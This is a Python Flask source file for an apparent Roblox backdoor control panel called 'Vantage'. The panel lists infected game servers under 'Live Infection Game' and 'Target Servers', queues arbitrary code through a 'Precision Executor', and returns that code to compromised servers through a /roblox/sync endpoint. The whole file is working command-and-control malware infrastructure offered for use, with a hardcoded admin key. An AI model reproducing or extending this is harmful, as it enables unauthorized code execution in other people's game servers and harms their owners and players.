import requests, time, os
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "vantage_v11_secret") # Secure key
ADMIN_KEY = "vantage_admin" # CHANGE THIS PASSWORD

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

data_store = {
    "active_servers": {}, 
    "whitelist": [], 
    "private_queues": {}, 
    "start_time": time.time()
}

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card-bg: #111; --border: #222; }
* { box-sizing: border-box; }
body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
.navbar { background: #000; border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 15px; position: sticky; top: 0; z-index: 100; }
.nav-item { color: #888; cursor: pointer; font-weight: bold; font-size: 13px; text-transform: uppercase; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); }
.viewport { flex: 1; padding: 20px; overflow-y: auto; }
.card { background: var(--card-bg); border: 1px solid var(--border); padding: 15px; border-radius: 12px; margin-bottom: 15px; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
.thumb-img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; margin-bottom:10px; }
.btn { background: var(--gold); color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top:10px; }
input, select, textarea { background: #000; border: 1px solid #333; padding: 15px; color: #fff; font-size: 16px; width: 100%; border-radius: 8px; margin-top:5px; }
.info-text { font-size: 12px; color: #888; margin-top: 5px; border-top: 1px solid #222; padding-top:5px; line-height: 1.5; }
"""

DASH_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>""" + BASE_CSS + """</style></head>
<body>
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Live Infection Game</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist system</div>
    </div>
    <div class="viewport">
        <div id="live" class="tab" style="display:block;"><h2>Target Servers</h2><div class="grid" id="server_grid"></div></div>
        <div id="exec" class="tab" style="display:none;">
            <h2>Precision Executor</h2><div class="card"><p>Target Player:</p><select id="target_sel"></select>
            <textarea id="code_area" style="height:350px; color:#0f0;" placeholder="print('Vantage Active')"></textarea>
            <button class="btn" onclick="execute()">EXECUTING</button></div>
        </div>
        <div id="white" class="tab" style="display:none;">
            <h2>Whitelist</h2><div class="card"><input id="w_input" placeholder="Username"><button class="btn" onclick="addWhite()">AUTHORIZE</button></div>
            <div id="w_list" class="grid" style="margin-top:20px;"></div>
        </div>
    </div>
<script>
    function tab(name, el) {
        document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
        document.getElementById(name).style.display = 'block';
        el.classList.add('active-nav');
    }
    function sync() {
        fetch('/api/data').then(r => r.json()).then(data => {
            let sHtml = "";
            for(let id in data.active_servers) {
                let s = data.active_servers[id];
                sHtml += `<div class="card"><img src="${s.thumb}" class="thumb-img"><h3>${s.name}</h3>
                    <div class="info-text"><b>Owner:</b> ${s.owner}<br><b>Players:</b> ${s.players.length}<br><b>Time:</b> ${s.uptime}s</div>
                    <button class="btn" style="padding:10px; font-size:12px;" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN</button></div>`;
            }
            document.getElementById('server_grid').innerHTML = sHtml || "No signals detected...";
            let wHtml = ""; let opts = "";
            data.whitelist.forEach(u => {
                opts += `<option value="${u.name}">${u.name}</option>`;
                wHtml += `<div class="card" style="display:flex; align-items:center; gap:10px; padding:10px;"><img src="${u.img}" style="width:40px; border-radius:50%;"><b>${u.name}</b></div>`;
            });
            document.getElementById('w_list').innerHTML = wHtml;
            document.getElementById('target_sel').innerHTML = opts || "<option>NO TARGETS</option>";
        });
    }
    function addWhite() {
        fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(() => sync());
    }
    function execute() {
        let t = document.getElementById('target_sel').value; let c = document.getElementById('code_area').value;
        if(t == "NO TARGETS") return;
        fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:t, code:c})});
        alert("Payload sent!");
    }
    setInterval(sync, 2000);
</script></body></html>
"""

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST' and request.form.get('password') == ADMIN_KEY:
        session['auth'] = True
        return redirect(url_for('index'))
    return render_template_string(f"<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>{BASE_CSS}</style></head><body><div style='display:flex; align-items:center; justify-content:center; height:100vh;'><div class='card' style='width:350px; text-align:center;'><h1>VANTAGE</h1><form action='/login' method='POST'><input type='password' name='password' placeholder='Enter Key' required><button type='submit' class='btn'>LOGIN</button></form></div></div></body></html>")

@app.route('/')
def index():
    if not session.get('auth'): return redirect(url_for('login'))
    return render_template_string(DASH_HTML)

@app.route('/api/data')
def get_data():
    if not session.get('auth'): return jsonify({}), 403
    return jsonify(data_store)

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    user = request.json.get("user")
    res = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}, headers=HEADERS).json()
    if res.get("data"):
        uid = res["data"][0]["id"]
        img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png", headers=HEADERS).json()["data"][0]["imageUrl"]
        data_store["whitelist"].append({"name": res["data"][0]["requestedUsername"], "img": img})
    return jsonify({"ok": True})

@app.route('/api/execute', methods=['POST'])
def run_exec():
    target = request.json.get("target")
    if target not in data_store["private_queues"]: data_store["private_queues"][target] = []
    data_store["private_queues"][target].append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    data = request.json
    jid = data.get("jobId")
    if not jid or jid == "": jid = f"SESSION_{data.get('game_id')}" # STUDIO FIX
    
    # Update or Create
    if jid not in data_store["active_servers"]:
        t_res = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png", headers=HEADERS).json()
        thumb = t_res["data"][0]["imageUrl"] if t_res.get("data") else ""
        data_store["active_servers"][jid] = {"thumb": thumb}

    data_store["active_servers"][jid].update({
        "place_id": data.get('game_id'), "name": data.get('name'), "owner": data.get('owner'), 
        "players": data.get('players'), "uptime": int(time.time() - data_store["start_time"]), "last_ping": time.time()
    })

    # CLEANUP DEAD SERVERS
    now = time.time()
    data_store["active_servers"] = {k: v for k, v in data_store["active_servers"].items() if now - v.get("last_ping", 0) < 10}

    commands = []
    for p in data.get("players"):
        if p in data_store["private_queues"]:
            for c in data_store["private_queues"][p]: commands.append({"user": p, "code": c})
            data_store["private_queues"][p] = []
    return jsonify({"commands": commands})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
